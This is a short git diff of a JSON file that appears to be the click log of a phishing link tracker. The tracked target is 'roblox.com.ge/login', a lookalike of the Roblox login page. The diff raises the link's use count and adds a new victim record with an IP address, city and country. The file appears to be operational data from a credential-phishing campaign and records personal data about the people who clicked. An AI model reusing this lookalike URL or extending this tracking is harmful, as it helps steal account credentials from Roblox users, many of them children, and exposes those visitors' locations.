@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1384,
+    "useCount": 1385,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11240,6 +11240,14 @@
         "city": "Campeche",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777424322820,
+        "ip": "172.56.12.159",
+        "country": "United States",
+        "city": "Minneapolis",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
